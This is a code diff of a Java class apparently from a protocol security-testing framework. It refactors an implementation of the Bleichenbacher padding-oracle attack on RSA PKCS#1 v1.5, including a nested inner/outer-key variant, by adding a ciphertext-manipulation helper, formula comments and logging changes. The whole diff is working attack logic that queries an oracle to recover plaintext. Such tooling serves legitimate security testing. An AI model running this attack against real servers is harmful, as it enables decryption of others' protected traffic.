@@ -52,6 +52,8 @@ public class Bleichenbacher extends Pkcs1Attack {
         super(msg, pkcsOracle);
         this.hostPublicKey = hostPublicKey;
         this.serverPublicKey = serverPublicKey;
+        counterInnerBleichenbacher = 0;
+        counterOuterBleichenbacher = 0;
     }
 
     /**
@@ -81,6 +83,14 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
     }
 
+    private BigInteger manipulateCiphertext(BigInteger s, BigInteger e, BigInteger n, byte[] c) {
+        BigInteger exponentiated = s.modPow(e, n);
+        BigInteger cipher = new BigInteger(1, c);
+        BigInteger res = cipher.multiply(exponentiated);
+
+        return res.mod(n);
+    }
+
     /**
      * Searches the smallest suitable s-value for the BB-Attack
      *
@@ -96,16 +106,21 @@ public class Bleichenbacher extends Pkcs1Attack {
         LOGGER.debug("Ciphertext: {} ", bytesToHex(ciphertext));
 
         while (true) {
-            BigInteger exponentiated =
+            // (c * pow(s,e,n)) % n
+            /*            BigInteger exponentiated =
                     s.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
             BigInteger cipher = new BigInteger(1, ciphertext);
             BigInteger res = cipher.multiply(exponentiated);
             BigInteger attempt = res.mod(rsaPublicKey.getModulus());
-            try {
-                Thread.sleep(0);
-            } catch (InterruptedException e) {
-                throw new RuntimeException(e);
-            }
+            */
+
+            BigInteger attempt =
+                    manipulateCiphertext(
+                            s,
+                            rsaPublicKey.getPublicExponent(),
+                            rsaPublicKey.getModulus(),
+                            ciphertext);
+
             boolean oracleResult = queryOracle(attempt, false);
             counterOuterBleichenbacher++;
 
@@ -136,11 +151,13 @@ public class Bleichenbacher extends Pkcs1Attack {
         LOGGER.debug("Ciphertext: {}", bytesToHex(ciphertext));
 
         while (true) {
-            BigInteger exponentiated =
-                    s.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
-            BigInteger cipher = new BigInteger(1, ciphertext);
-            BigInteger res = cipher.multiply(exponentiated);
-            BigInteger attempt = res.mod(rsaPublicKey.getModulus());
+            // (c * pow(s,e,n)) % n
+            BigInteger attempt =
+                    manipulateCiphertext(
+                            s,
+                            rsaPublicKey.getPublicExponent(),
+                            rsaPublicKey.getModulus(),
+                            ciphertext);
 
             BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
 
@@ -180,11 +197,15 @@ public class Bleichenbacher extends Pkcs1Attack {
                 lowerBound.toString(16),
                 upperBound.toString(16));
 
+        //  ri = ceil(2 * (b * prev_s - 2 * B), n)
         BigInteger bTimesPrevs = upperBound.multiply(previousS);
         BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
         BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
 
         while (true) {
+
+            // si_lower = ceil(2 * B + ri * n, b)
+            // si_upper = ceil(3 * B + ri * n, a)
             BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
             BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
             BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);
@@ -192,14 +213,22 @@ public class Bleichenbacher extends Pkcs1Attack {
             for (BigInteger si = si_lower;
                     si.compareTo(si_upper) < 0;
                     si = si.add(BigInteger.ONE)) {
-                BigInteger exponentiated =
+
+                // (c * pow(si, e, n)) % n
+                /*                BigInteger exponentiated =
                         si.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
                 BigInteger cipher = new BigInteger(1, ciphertext);
                 BigInteger res = cipher.multiply(exponentiated);
-                BigInteger attempt = res.mod(rsaPublicKey.getModulus());
+                BigInteger attempt = res.mod(rsaPublicKey.getModulus());*/
+
+                BigInteger attempt =
+                        manipulateCiphertext(
+                                si,
+                                rsaPublicKey.getPublicExponent(),
+                                rsaPublicKey.getModulus(),
+                                ciphertext);
 
                 BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
-
                 boolean oracleResult = queryOracle(encryptedAttempt, true);
                 counterInnerBleichenbacher++;
 
@@ -233,11 +262,15 @@ public class Bleichenbacher extends Pkcs1Attack {
                 lowerBound.toString(16),
                 upperBound.toString(16));
 
+        //  ri = ceil(2 * (b * prev_s - 2 * B), n)
         BigInteger bTimesPrevs = upperBound.multiply(previousS);
         BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
         BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
 
         while (true) {
+
+            // si_lower = ceil(2 * B + ri * n, b)
+            // si_upper = ceil(3 * B + ri * n, a)
             BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
             BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
             BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);
@@ -245,11 +278,21 @@ public class Bleichenbacher extends Pkcs1Attack {
             for (BigInteger si = si_lower;
                     si.compareTo(si_upper) < 0;
                     si = si.add(BigInteger.ONE)) {
-                BigInteger exponentiated =
+
+                // (c * pow(si, e, n)) % n
+                /*                BigInteger exponentiated =
                         si.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
                 BigInteger cipher = new BigInteger(1, ciphertext);
                 BigInteger res = cipher.multiply(exponentiated);
-                BigInteger attempt = res.mod(rsaPublicKey.getModulus());
+                BigInteger attempt = res.mod(rsaPublicKey.getModulus());*/
+
+                BigInteger attempt =
+                        manipulateCiphertext(
+                                si,
+                                rsaPublicKey.getPublicExponent(),
+                                rsaPublicKey.getModulus(),
+                                ciphertext);
+
                 boolean oracleResult = queryOracle(attempt, false);
                 counterOuterBleichenbacher++;
 
@@ -326,6 +369,8 @@ public class Bleichenbacher extends Pkcs1Attack {
                     "found r_upper: {} from upperPartForCeil: {}",
                     r_upper.toString(16),
                     upperPartForCeil.toString(16));
+
+            LOGGER.debug("Compare:{}", r_lower.compareTo(r_upper));
 
             for (BigInteger r = r_lower; r.compareTo(r_upper) < 0; r = r.add(BigInteger.ONE)) {
                 BigInteger lowerBound = chosenInterval.lower;
@@ -416,16 +461,26 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_sub_one = three_B.subtract(BigInteger.ONE);
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
-        LOGGER.debug("inner bitsize: {}", innerBitsize);
-        LOGGER.debug("inner k: {}", innerK);
-        LOGGER.debug("B: {}", B.toString(16));
-        LOGGER.debug("2B: {}", two_B.toString(16));
-        LOGGER.debug("3B: {}", three_B.toString(16));
-        LOGGER.debug("3B - 1 : {}", three_B_sub_one.toString(16));
-        LOGGER.debug("Ciphertext: {}", ArrayConverter.bytesToHexString(innerCiphertext));
+        return innerBleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey);
+    }
 
-        // new ciphertext is cracked inner ciphertext
-        ciphertext = innerCiphertext;
+    private byte[] innerBleichenbacher(
+            byte[] ciphertext,
+            CustomRsaPublicKey innerPublicKey,
+            CustomRsaPublicKey outerPublicKey) {
+
+        int innerBitsize = innerPublicKey.getModulus().bitLength();
+        int innerK = innerBitsize / 8;
+
+        LOGGER.debug(
+                "bitsize: {}\nk: {}\nB: {}\n2B: {}\n3B: {}\n3B - 1: {}\nCiphertext: {}",
+                innerBitsize,
+                innerK,
+                B.toString(16),
+                two_B.toString(16),
+                three_B.toString(16),
+                three_B_sub_one.toString(16),
+                bytesToHex(ciphertext));
 
         List<Interval> M = new ArrayList<>();
         M.add(new Interval(two_B, three_B_sub_one));
@@ -458,8 +513,7 @@ public class Bleichenbacher extends Pkcs1Attack {
                 BigInteger a = M.get(0).lower;
                 BigInteger b = M.get(0).upper;
                 if (a.equals(b)) {
-                    byte[] result = a.toByteArray();
-                    return result;
+                    return ArrayConverter.bigIntegerToByteArray(a);
                 }
                 s = find_s_in_range_nested(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
             }
@@ -488,15 +542,6 @@ public class Bleichenbacher extends Pkcs1Attack {
                 three_B_sub_one.toString(16),
                 bytesToHex(ciphertext));
 
-        /*
-        LOGGER.debug("bitsize: " + bitsize);
-        LOGGER.debug("k: " + k);
-        LOGGER.debug("B: " + B.toString(16));
-        LOGGER.debug("2B: " + two_B.toString(16));
-        LOGGER.debug("3B: " + three_B.toString(16));
-        LOGGER.debug("3B - 1: " + three_B_sub_one.toString(16));
-        LOGGER.debug("Ciphertext: " + bytesToHex(ciphertext));*/
-
         List<Interval> M = new ArrayList<>();
         M.add(new Interval(two_B, three_B_sub_one));
         LOGGER.debug(
@@ -522,8 +567,7 @@ public class Bleichenbacher extends Pkcs1Attack {
                 BigInteger a = M.get(0).lower;
                 BigInteger b = M.get(0).upper;
                 if (a.equals(b)) {
-                    byte[] result = a.toByteArray();
-                    return result;
+                    return ArrayConverter.bigIntegerToByteArray(a);
                 }
                 s = find_s_in_range(a, b, s, ciphertext, publicKey);
             }
@@ -566,7 +610,11 @@ public class Bleichenbacher extends Pkcs1Attack {
             }
         }
 
-        return Arrays.copyOfRange(encodedPayload, idx + 1, encodedPayload.length);
+        if (idx != 0) {
+            idx = idx + 1;
+        }
+
+        return Arrays.copyOfRange(encodedPayload, idx, encodedPayload.length);
     }
 
     /**
@@ -582,7 +630,8 @@ public class Bleichenbacher extends Pkcs1Attack {
 
             javaCipher.init(Cipher.ENCRYPT_MODE, encryptionKey);
 
-            return new BigInteger(javaCipher.doFinal(attempt.toByteArray()));
+            return new BigInteger(
+                    javaCipher.doFinal(ArrayConverter.bigIntegerToByteArray(attempt)));
 
         } catch (InvalidKeyException
                 | IllegalBlockSizeException
